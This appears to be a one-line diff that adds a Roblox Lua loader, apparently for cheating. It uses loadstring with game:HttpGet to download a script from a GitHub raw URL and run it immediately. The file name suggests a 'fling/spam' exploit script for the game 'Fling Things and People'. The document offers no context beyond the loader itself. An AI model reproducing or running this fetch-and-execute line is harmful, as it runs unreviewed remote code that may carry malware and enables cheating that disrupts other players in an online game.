@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/fling-things-and-people-spam6-9fy0z8johc97yd.lua"))()
